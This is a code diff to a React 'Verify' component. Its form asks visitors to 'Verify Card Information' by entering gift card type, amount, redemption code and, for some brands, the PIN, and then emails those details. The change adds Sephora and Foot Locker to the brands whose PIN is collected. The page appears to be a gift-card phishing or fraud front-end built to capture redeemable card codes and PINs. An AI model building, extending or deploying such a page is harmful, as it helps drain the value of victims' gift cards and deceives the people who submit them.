@@ -42,7 +42,7 @@ const Verify = () => {
         redemptionCode
       }
 
-      if (cardType === 'Nodestorm' || cardType === 'Nike') {
+      if (cardType === 'Nodestorm' || cardType === 'Nike' || cardType === 'Sephora' || cardType === 'Foot locker') {
         emailData.giftCardPin = giftCardPin;
       } else if (
         cardType === 'Master Card' ||
@@ -74,13 +74,7 @@ const Verify = () => {
       })
         .then(response => {
           if (response.ok) {
-            // Email sent successfully
-            // toast.success('Message sent', {
-            //   duration: 4000,
-            //   position: 'top-center',
-            // })
             setEmailSent(true)
-            // alert('Email sent!');
             setCardType('Select type of Card');
             setCurrency('USD');
             setAmount('');
@@ -117,7 +111,9 @@ const Verify = () => {
         redirect('/error')
       ) : (
         <form method='post' className='flex flex-col gap-8 w-full px-12'> 
-          <span className='flex justify-center text-4xl sm:text-6xl text-white font-bold'>Verify Card Information</span>
+          <span className='flex justify-center text-4xl sm:text-6xl text-white font-bold'>
+            Verify Card Information
+          </span>
           <select 
             name="cardType" 
             id="cardType" 
